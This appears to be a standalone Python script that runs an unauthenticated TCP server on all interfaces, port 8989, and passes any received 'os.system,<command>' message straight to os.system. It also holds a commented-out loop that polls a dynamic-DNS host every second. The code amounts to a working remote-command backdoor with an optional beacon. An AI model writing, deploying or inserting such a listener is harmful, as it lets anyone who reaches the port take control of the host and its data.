import os
import datetime
import time
import socket
import urllib.request
import _thread


def alive():
    while 1:
        try:
            url = "http://wwkiyyx.xicp.net"
            print(datetime.datetime.now(), url)
            print(urllib.request.urlopen(url).read().decode('utf-8'))
        except Exception as ex:
            print(datetime.datetime.now(), ex)
        time.sleep(1)


def client(clientsocket, addr):
    try:
        data = clientsocket.recv(10240).decode('utf-8')
        print(datetime.datetime.now(), data)
        cmd = data.split(',')
        if cmd[0] == 'hello':
            response = "hello"
            clientsocket.send(bytes(response, "utf-8"))
            clientsocket.close()
        elif cmd[0] == 'os.system':
            res = os.system(cmd[1])
            print(res)
            response = "finish"
            clientsocket.send(bytes(response, "utf-8"))
            clientsocket.close()
        else:
            response_start_line = "HTTP/1.1 200 OK\r\n"
            response_body = "<h1>hello</h1>"
            response = response_start_line + "\r\n" + response_body
            clientsocket.send(bytes(response, "utf-8"))
            clientsocket.close()    
    except Exception as ex:
        print(datetime.datetime.now(), addr, ex)


print(datetime.datetime.now(), " start")
#_thread.start_new_thread(alive, ())
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(('0.0.0.0', 8989))
serversocket.listen(100)
print(datetime.datetime.now(), " at 0.0.0.0:8989")
while 1:
    clientsocket, addr = serversocket.accept()
    print(datetime.datetime.now(), addr)
    _thread.start_new_thread(client, (clientsocket, addr))
    time.sleep(1)
print(datetime.datetime.now(), " exit")

